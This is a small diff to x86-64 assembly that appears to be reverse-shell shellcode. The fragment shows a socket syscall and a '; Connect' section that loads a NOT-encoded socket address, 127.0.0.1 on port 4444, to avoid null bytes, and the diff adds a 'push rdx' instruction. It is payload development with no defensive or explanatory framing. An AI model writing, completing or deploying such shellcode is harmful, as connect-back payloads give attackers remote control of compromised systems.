@@ -36,6 +36,7 @@ _start:
 	cdq
 	syscall
 ; Connect
+	push rdx
 	xchg edi, eax
 	mov rbx, 0xfeffff80a3eefffd ; not encoded 0x0100007f5c110002
 	not rbx
